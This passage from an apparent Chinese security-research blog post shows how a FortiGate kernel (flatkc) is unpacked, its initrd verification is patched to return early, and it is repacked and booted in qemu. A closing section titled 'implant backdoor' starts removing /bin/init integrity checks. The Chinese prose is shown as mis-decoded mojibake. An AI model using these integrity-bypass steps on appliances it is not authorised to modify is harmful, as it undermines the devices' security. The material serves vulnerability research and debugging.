heap = <span class="number">0LL</span>;</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">3820</span>, <span class="number">0</span>, <span class="number">276LL</span>);</span><br><span class="line">    v11 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11[<span class="number">6</span>] == <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_7006B8 = <span class="number">720896LL</span>;</span><br><span class="line">    dword_7006B0 = <span class="number">948</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    qword_7006B8 = <span class="number">753664LL</span>;</span><br><span class="line">    dword_7006B0 = <span class="number">980</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_7006AC = v11[<span class="number">14</span>];</span><br><span class="line">  dword_7006A8 = v11[<span class="number">7</span>];</span><br><span class="line">  sub_6E6F90();</span><br><span class="line">  qword_700688 = v8;</span><br><span class="line">  qword_700680 = v8 + <span class="number">0x10000</span>;</span><br><span class="line">  v13 = &amp;unk_1826000;</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;output_len &gt;= <span class="number">0x1826000</span>uLL )</span><br><span class="line">    v13 = *&amp;output_len;</span><br><span class="line">  <span class="keyword">if</span> ( (output &amp; <span class="number">0x1FFFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;Destination physical address inappropriately aligned&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">0x3FFFFFFFFFFF</span>LL )</span><br><span class="line">    error(<span class="string">&quot;Destination address too large&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( v13 + <span class="number">0x200000</span> &gt; <span class="number">0x20000000</span> )            <span class="comment">// KERNEL_IMAGE_SIZE</span></span><br><span class="line">    error(<span class="string">&quot;Destination virtual address is beyond the kernel mapping area&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( output != LOAD_PHYSICAL_ADDR )</span><br><span class="line">    error(<span class="string">&quot;Destination address does not match LOAD_PHYSICAL_ADDR&quot;</span>, heap);</span><br><span class="line">  v14 = input_data;</span><br><span class="line">  <span class="keyword">if</span> ( !input_data )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">malloc</span>(<span class="number">0x4000</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      error(<span class="string">&quot;Out of memory while allocating input buffer&quot;</span>, heap);</span><br><span class="line">    *&amp;input_len = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = <span class="built_in">malloc</span>(<span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    error(<span class="string">&quot;Out of memory while allocating z_stream&quot;</span>, heap);</span><br><span class="line">  v16 = <span class="built_in">malloc</span>(<span class="number">0x2548</span>uLL);</span><br><span class="line">  v15[<span class="number">8</span>] = v16;</span><br><span class="line">  v18 = v16;</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">    error(<span class="string">&quot;Out of memory while allocating workspace&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( !*&amp;input_len )</span><br><span class="line">  &#123;</span><br><span class="line">    heap = sub_4000;</span><br><span class="line">    *&amp;input_len = fill(v14, <span class="number">0x4000</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;input_len &lt;= <span class="number">9</span> || *v14 != <span class="number">31</span> || v14[<span class="number">1</span>] != <span class="number">0x8B</span> || v14[<span class="number">2</span>] != <span class="number">8</span> )</span><br><span class="line">    error(<span class="string">&quot;Not a gzip file&quot;</span>, heap);</span><br><span class="line">  v19 = *&amp;input_len - <span class="number">10LL</span>;</span><br><span class="line">  *v15 = v14 + <span class="number">10</span>;</span><br><span class="line">  v15[<span class="number">1</span>] = v19;</span><br><span class="line">  <span class="keyword">if</span> ( (v14[<span class="number">3</span>] &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v19 )</span><br><span class="line">        error(<span class="string">&quot;header error&quot;</span>, heap);</span><br><span class="line">      v20 = *v15;</span><br><span class="line">      v15[<span class="number">1</span>] = --v19;</span><br><span class="line">      *v15 = v20 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v20 );</span><br><span class="line">  &#125;</span><br><span class="line">  v15[<span class="number">7</span>] = v18;</span><br><span class="line">  v15[<span class="number">3</span>] = <span class="number">0x200000</span>LL;</span><br><span class="line">  v15[<span class="number">4</span>] = v17;</span><br><span class="line">  v15[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v18[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v18[<span class="number">10</span>] = <span class="number">15</span>;</span><br><span class="line">  *(v18 + <span class="number">7</span>) = v15[<span class="number">8</span>] + <span class="number">9544LL</span>;</span><br><span class="line">  v21 = sub_6E4440(v15);</span><br><span class="line">  *(v15[<span class="number">8</span>] + <span class="number">44LL</span>) = <span class="number">0</span>;</span><br><span class="line">  *(v15[<span class="number">8</span>] + <span class="number">56LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v15[<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = fill(v14, <span class="number">0x4000</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( v22 &lt; <span class="number">0</span> )</span><br><span class="line">          error(<span class="string">&quot;read error&quot;</span>, <span class="number">0x4000</span>LL);</span><br><span class="line">        *v15 = v14;</span><br><span class="line">        v15[<span class="number">1</span>] = v22;</span><br><span class="line">      &#125;</span><br><span class="line">      v23 = sub_6E4540(v15, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        error(<span class="string">&quot;uncompression error&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_700698 = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !input_data )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_700698 = <span class="number">-3</span>;</span><br><span class="line">    qword_7006A0 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_6E6A90(v29, LOAD_PHYSICAL_ADDR);</span><br><span class="line">  <span class="keyword">if</span> ( v29[<span class="number">0</span>] != <span class="number">1179403647</span> )</span><br><span class="line">    error(<span class="string">&quot;Kernel is not a valid ELF file&quot;</span>, LOAD_PHYSICAL_ADDR);</span><br><span class="line">  v24 = <span class="built_in">malloc</span>(<span class="number">56</span> * v31);</span><br><span class="line">  v25 = v24;</span><br><span class="line">  <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    error(<span class="string">&quot;Failed to allocate space for phdrs&quot;</span>, LOAD_PHYSICAL_ADDR);</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v27 = v30 + <span class="number">0x200000</span>;</span><br><span class="line">  sub_6E6A90(v24, v30 + <span class="number">0x200000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v25[<span class="number">12</span>] &amp; <span class="number">0x1FFFFF</span>) != <span class="number">0</span> )</span><br><span class="line">          error(<span class="string">&quot;Alignment of LOAD segment isn&#x27;t multiple of 2MB&quot;</span>, v27);</span><br><span class="line">        v27 = *(v25 + <span class="number">1</span>) + <span class="number">0x200000</span>LL;</span><br><span class="line">        sub_6E6A30(*(v25 + <span class="number">3</span>), v27);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v26;</span><br><span class="line">      v25 += <span class="number">14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v26 &lt; v31 );</span><br><span class="line">  &#125;</span><br><span class="line">  dword_700698 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> LOAD_PHYSICAL_ADDR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è§‚å¯Ÿå‘ç°å‡½æ•°å¼€å¤´å’Œæºç å¤§è‡´ç›¸åŒï¼Œä½†åé¢å‡ºç°äº†ä¸€äº›å’Œ gzip è§£å‹ç›¸å…³çš„ä»£ç ï¼Œæœç´¢å­—ç¬¦ä¸²åœ¨ decompress_inflate.c æ‰¾åˆ°çš„ç›¸å…³å®šä¹‰</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">int</span> INIT __gunzip(<span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">long</span> len,</span><br><span class="line">		       <span class="type">long</span> (*fill)(<span class="type">void</span>*, <span class="type">unsigned</span> <span class="type">long</span>),</span><br><span class="line">		       <span class="type">long</span> (*flush)(<span class="type">void</span>*, <span class="type">unsigned</span> <span class="type">long</span>),</span><br><span class="line">		       <span class="type">unsigned</span> <span class="type">char</span> *out_buf, <span class="type">long</span> out_len,</span><br><span class="line">		       <span class="type">long</span> *pos,</span><br><span class="line">		       <span class="type">void</span>(*error)(<span class="type">char</span> *x)) &#123;</span><br><span class="line">	u8 *zbuf;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">z_stream_s</span> *<span class="title">strm</span>;</span></span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	rc = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (flush) &#123;</span><br><span class="line">		out_len = <span class="number">0x8000</span>; <span class="comment">/* 32 K */</span></span><br><span class="line">		out_buf = <span class="built_in">malloc</span>(out_len);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!out_len)</span><br><span class="line">			out_len = ((<span class="type">size_t</span>)~<span class="number">0</span>) - (<span class="type">size_t</span>)out_buf; <span class="comment">/* no limit */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!out_buf) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating output buffer&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (buf)</span><br><span class="line">		zbuf = buf;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		zbuf = <span class="built_in">malloc</span>(GZIP_IOBUF_SIZE);</span><br><span class="line">		len = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!zbuf) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating input buffer&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strm = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*strm));</span><br><span class="line">	<span class="keyword">if</span> (strm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating z_stream&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem3;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strm-&gt;workspace = <span class="built_in">malloc</span>(flush ? zlib_inflate_workspacesize() :</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> inflate_state));</span><br><span class="line">	<span class="keyword">if</span> (strm-&gt;workspace == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating workspace&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem4;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!fill)</span><br><span class="line">		fill = nofill;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">		len = fill(zbuf, GZIP_IOBUF_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* verify the gzip header */</span></span><br><span class="line">	<span class="keyword">if</span> (len &lt; <span class="number">10</span> ||</span><br><span class="line">	   zbuf[<span class="number">0</span>] != <span class="number">0x1f</span> || zbuf[<span class="number">1</span>] != <span class="number">0x8b</span> || zbuf[<span class="number">2</span>] != <span class="number">0x08</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pos)</span><br><span class="line">			*pos = <span class="number">0</span>;</span><br><span class="line">		error(<span class="string">&quot;Not a gzip file&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_5;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* skip over gzip header (1f,8b,08... 10 bytes total +</span></span><br><span class="line"><span class="comment">	 * possible asciz filename)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	strm-&gt;next_in = zbuf + <span class="number">10</span>;</span><br><span class="line">	strm-&gt;avail_in = len - <span class="number">10</span>;</span><br><span class="line">	<span class="comment">/* skip over asciz filename */</span></span><br><span class="line">	<span class="keyword">if</span> (zbuf[<span class="number">3</span>] &amp; <span class="number">0x8</span>) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If the filename doesn&#x27;t fit into the buffer,</span></span><br><span class="line"><span class="comment">			 * the file is very probably corrupt. Don&#x27;t try</span></span><br><span class="line"><span class="comment">			 * to read more data.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (strm-&gt;avail_in == <span class="number">0</span>) &#123;</span><br><span class="line">				error(<span class="string">&quot;header error&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> gunzip_5;</span><br><span class="line">			&#125;</span><br><span class="line">			--strm-&gt;avail_in;</span><br><span class="line">		&#125; <span class="keyword">while</span> (*strm-&gt;next_in++);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strm-&gt;next_out = out_buf;</span><br><span class="line">	strm-&gt;avail_out = out_len;</span><br><span class="line"></span><br><span class="line">	rc = zlib_inflateInit2(strm, -MAX_WBITS);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!flush) &#123;</span><br><span class="line">		WS(strm)-&gt;inflate_state.wsize = <span class="number">0</span>;</span><br><span class="line">		WS(strm)-&gt;inflate_state.window = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (rc == Z_OK) &#123;</span><br><span class="line">		<span class="keyword">if</span> (strm-&gt;avail_in == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">/* <span class="doctag">TODO:</span> handle case where both pos and fill are set */</span></span><br><span class="line">			len = fill(zbuf, GZIP_IOBUF_SIZE);</span><br><span class="line">			<span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				rc = <span class="number">-1</span>;</span><br><span class="line">				error(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			strm-&gt;next_in = zbuf;</span><br><span class="line">			strm-&gt;avail_in = len;</span><br><span class="line">		&#125;</span><br><span class="line">		rc = zlib_inflate(strm, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Write any data generated */</span></span><br><span class="line">		<span class="keyword">if</span> (flush &amp;&amp; strm-&gt;next_out &gt; out_buf) &#123;</span><br><span class="line">			<span class="type">long</span> l = strm-&gt;next_out - out_buf;</span><br><span class="line">			<span class="keyword">if</span> (l != flush(out_buf, l)) &#123;</span><br><span class="line">				rc = <span class="number">-1</span>;</span><br><span class="line">				error(<span class="string">&quot;write error&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			strm-&gt;next_out = out_buf;</span><br><span class="line">			strm-&gt;avail_out = out_len;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* after Z_FINISH, only Z_STREAM_END is &quot;we unpacked it all&quot; */</span></span><br><span class="line">		<span class="keyword">if</span> (rc == Z_STREAM_END) &#123;</span><br><span class="line">			rc = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc != Z_OK) &#123;</span><br><span class="line">			error(<span class="string">&quot;uncompression error&quot;</span>);</span><br><span class="line">			rc = <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	zlib_inflateEnd(strm);</span><br><span class="line">	<span class="keyword">if</span> (pos)</span><br><span class="line">		<span class="comment">/* add + 8 to skip over trailer */</span></span><br><span class="line">		*pos = strm-&gt;next_in - zbuf+<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">gunzip_5:</span><br><span class="line">	<span class="built_in">free</span>(strm-&gt;workspace);</span><br><span class="line">gunzip_nomem4:</span><br><span class="line">	<span class="built_in">free</span>(strm);</span><br><span class="line">gunzip_nomem3:</span><br><span class="line">	<span class="keyword">if</span> (!buf)</span><br><span class="line">		<span class="built_in">free</span>(zbuf);</span><br><span class="line">gunzip_nomem2:</span><br><span class="line">	<span class="keyword">if</span> (flush)</span><br><span class="line">		<span class="built_in">free</span>(out_buf);</span><br><span class="line">gunzip_nomem1:</span><br><span class="line">	<span class="keyword">return</span> rc; <span class="comment">/* returns Z_OK (0) if successful */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™è¯´æ˜ vmlinux ä½¿ç”¨ gzip ç®—æ³•å‹ç¼©ï¼Œé€šè¿‡ binwalk ä¹Ÿå¯ä»¥éªŒè¯è¿™ä¸€ç‚¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Microsoft executable, portable (PE)</span><br><span class="line">16820         0x41B4          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)</span><br><span class="line">7381096       0x70A068        Object signature in DER format (PKCS header length: 4, sequence length: 3274</span><br><span class="line">7381235       0x70A0F3        Certificate in DER format (x509 v3), header length: 4, sequence length: 2279</span><br></pre></td></tr></table></figure></div>

<p>ä»æºç çœ‹åˆ° extract_kernel å‡½æ•°åœ¨ head_64.S ä¸­è¢«è°ƒç”¨</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Do the extraction, and jump to the new kernel..</span><br><span class="line"> */</span><br><span class="line">	pushq	%rsi			/* Save the real mode argument */</span><br><span class="line">	movq	%rsi, %rdi		/* real mode address */</span><br><span class="line">	leaq	boot_heap(%rip), %rsi	/* malloc area for uncompression */</span><br><span class="line">	leaq	input_data(%rip), %rdx  /* input_data */</span><br><span class="line">	movl	$z_input_len, %ecx	/* input_len */</span><br><span class="line">	movq	%rbp, %r8		/* output target address */</span><br><span class="line">	movq	$z_output_len, %r9	/* decompressed length, end of relocs */</span><br><span class="line">	call	extract_kernel		/* returns kernel location in %rax */</span><br><span class="line">	popq	%rsi</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ flatkc ä¹Ÿå¯ä»¥æ‰¾åˆ°å¯¹åº”ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rsi</span><br><span class="line">mov     rdi, rsi</span><br><span class="line">lea     rsi, qword_6EC680</span><br><span class="line">lea     rdx, gzip_start</span><br><span class="line">mov     ecx, 6DF3A4h</span><br><span class="line">mov     r8, rbp    /* 0x20000 */</span><br><span class="line">mov     r9, 1A34918h</span><br><span class="line">call    extract_kernel</span><br><span class="line">pop     rsi</span><br><span class="line">jmp     rax</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®å‚æ•°ä½ç½®ï¼Œå‘ç° Piggy çš„èµ·å§‹åœ°å€ä¸º 0x41B4ï¼Œé•¿åº¦ä¸º 0x6DF3A4ï¼Œæœ€ç»ˆè§£å‹å¾—åˆ°çš„ vmlinux å¤§å°åº”è¯¥æ˜¯ 0x1A34918ã€‚</p>
<p>æ‰€ä»¥å…ˆå°† Piggy æ‹†å‡º</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=flatkc of=vmlinux.gz ibs=1 skip=$[0x41B4] count=$[0x6DF3A4]</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥çœ‹ Piggy ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmlinux.gz: gzip compressed data, max compression, from Unix, original size modulo 2^32 27478296</span><br></pre></td></tr></table></figure></div>

<p>ä½¿ç”¨ gzip è§£å‹å¾—åˆ° vmlinux</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gzip -d vmlinux.gz</span><br><span class="line"></span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=c1b391e6e7366ccf79173bd1fd93aac1935cf9f6, stripped</span><br></pre></td></tr></table></figure></div>

<p>æ¥ä¸‹æ¥è¦å¯¹ vmlinux è¿›è¡Œä¿®æ”¹ï¼Œä¸ºäº†æ–¹ä¾¿å®šä½éœ€è¦ä¿®æ”¹çš„åœ°å€ï¼Œå¯ä»¥å…ˆä½¿ç”¨ vmlinux-to-elf å°† vmlinux è½¬æ¢ä¸ºå¸¦æœ‰ç¬¦å·ä¿¡æ¯çš„ ELF æ–‡ä»¶ï¼Œé€šè¿‡é€†å‘å®šä½åˆ° fgt_verify_initrd å‡½æ•°åœ°å€æ˜¯ 0xFFFFFFFF81709689ï¼Œè€ƒè™‘è¿™ä¸ªå‡½æ•°åªæ“ä½œäº† initramfs_start å’Œ initramfs_stop å³ rootfs.gz çš„æ•°æ®ï¼Œæˆ‘ä»¬é€‰æ‹©ç›´æ¥å°†å‡½æ•°ç¬¬ä¸€æ¡æŒ‡ä»¤æ”¹ä¸º ret</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init.text:FFFFFFFF81709689  retn</span><br><span class="line">.init.text:FFFFFFFF8170968A  mov     rbp, rsp</span><br><span class="line">.init.text:FFFFFFFF8170968D  push    r15</span><br><span class="line">.init.text:FFFFFFFF8170968F  push    r14</span><br><span class="line">.init.text:FFFFFFFF81709691  push    r13</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæŠŠ Patch å¥½çš„ vmlinux é‡æ–°å‹ç¼©å› gzip æ ¼å¼</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> vmlinux | gzip -9 &gt; vmlinux.gz</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥çœ‹æ–°æ–‡æ¡£å’ŒåŸæ–‡æ¡£çš„å¤§å°å·®å¼‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rw-rw-r--  1 admin admin   7205795  3æœˆ 15 09:07 vmlinux.gz</span><br><span class="line">-rw-rw-r--  1 admin admin   7205796  3æœˆ 15 08:57 vmlinux.gz.ori</span><br></pre></td></tr></table></figure></div>

<p>æ–°çš„æ–‡æ¡£æ¯”åŸæ–‡æ¡£å°ä¸€ä¸ªå­—èŠ‚ï¼Œå…ˆå°†æ–°æ–‡æ¡£è¦†ç›–å› flatkc</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=flatkc bs=1 seek=$[0x41B4] count=$[0x6DF3A4] conv=notrunc</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=vmlinux.gz of=flatkc bs=1 seek=$[0x41B4] conv=notrunc</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºåœ¨ gzip æ–‡ä»¶ç»“å°¾æ·»åŠ å¤šä½™å­—ç¬¦æ—¶å¯èƒ½ä¼šå¯¼è‡´è§£å‹å¤±è´¥ï¼Œæ‰€ä»¥ä¿®æ”¹è°ƒç”¨ extract_kernel çš„æ±‡ç¼–ä»£ç ï¼Œå°† input_len ä¿®æ”¹ä¸ºå®é™…é•¿åº¦ 7205795ã€‚</p>
<p>ä½¿ç”¨ qemu åœ¨æœ¬åœ°å¯åŠ¨æµ‹è¯•</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -serial stdio -M q35 -m 1024 -kernel flatkc</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_4.png"
                     
                ></p>
<p>å¯åŠ¨ä¹‹åå†…æ ¸ panic åœ¨ mount_block_root ä½ç½®ï¼Œå› ä¸ºæœ¬åœ°æ¨¡æ‹Ÿä¸å­˜åœ¨ rootfs.gz æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™åº”è¯¥æ˜¯æ­£å¸¸ç°è±¡ã€‚</p>
<h2 id="æ¤å…¥åé—¨"><a href="#æ¤å…¥åé—¨" class="headerlink" title="æ¤å…¥åé—¨"></a>æ¤å…¥åé—¨</h2><p>å†…æ ¸ä¿®æ”¹å®Œæ¯•ï¼Œä¸‹é¢è¦å‘ç³»ç»Ÿæ¤å…¥åé—¨ã€‚</p>
<p>ä¿®æ”¹ä¹‹åçš„å†…æ ¸ç†è®ºä¸Šå·²ç»ä¸ä¼šå†å¯¹ rootfs.gz æ‰§è¡Œæ ¡éªŒå’ŒåŠ å¯†ï¼Œæ‰€ä»¥è¦å°†è™šæ‹Ÿç£ç›˜ä¸­è¢«åŠ å¯†çš„ rootfs.gz æ›¿æ¢ä¸ºæ˜æ–‡ç‰ˆæœ¬ã€‚è§£å¯†ç®—æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œ ä¹Ÿå¯ä»¥ä½¿ç”¨æˆ‘ç¼–å†™çš„<a class="link"   href="https://gist.github.com/rrrrrrri/e5b47cb974caae26564f6ab6d0959d01" >å°å·¥å…·<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ç”Ÿæˆçš„ dec.gz æœ«å°¾ 256 å­—èŠ‚æ˜¯æ ¡éªŒæ•°æ®ï¼Œè¦æ‰‹åŠ¨å°†å®ƒä»¬å»é™¤ã€‚</p>
<p>è§£å‹ rootfs.gz å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œé¦–å…ˆè¦æŠŠ &#x2F;bin&#x2F;init ä¸­å®Œæ•´æ€§æ ¡éªŒé€»è¾‘ Patch æ‰ï¼Œé€šè¿‡é€†å‘åˆ†æå‘ç°å½“å®Œæ•´æ€§æ ¡éªŒå¤±è´¥æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œ do_halt å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( sub_4557C0() )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( system_integrity_check(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( sub_2BC8AF0(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_2CC6290();</span><br><span class="line">  <span class="keyword">if</span> ( sub_4543F0(<span class="string">&quot;/bin/fips_self_test&quot;</span>) )</span><br><span class="line">    do_halt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_455770() )</span><br><span class="line">    do_halt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

